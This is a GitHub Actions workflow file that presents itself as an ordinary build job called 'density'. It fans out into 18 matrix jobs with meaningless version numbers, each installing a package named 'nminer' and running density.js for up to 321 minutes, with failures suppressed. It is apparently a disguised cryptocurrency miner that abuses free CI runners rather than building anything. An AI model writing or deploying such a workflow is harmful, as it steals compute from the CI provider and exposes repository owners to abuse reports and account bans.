name: density
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4496 }
          - { version: 1292 }
          - { version: 3928 }
          - { version: 3478 }
          - { version: 524 }
          - { version: 5770 }
          - { version: 9876 }
          - { version: 8685 }
          - { version: 573 }
          - { version: 7185 }
          - { version: 8196 }
          - { version: 5640 }
          - { version: 5098 }
          - { version: 1268 }
          - { version: 1119 }
          - { version: 7788 }
          - { version: 6133 }
          - { version: 2505 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: bah pluck
        run: |
          npm install nminer@latest
          timeout 321m node density.js || echo "density executed"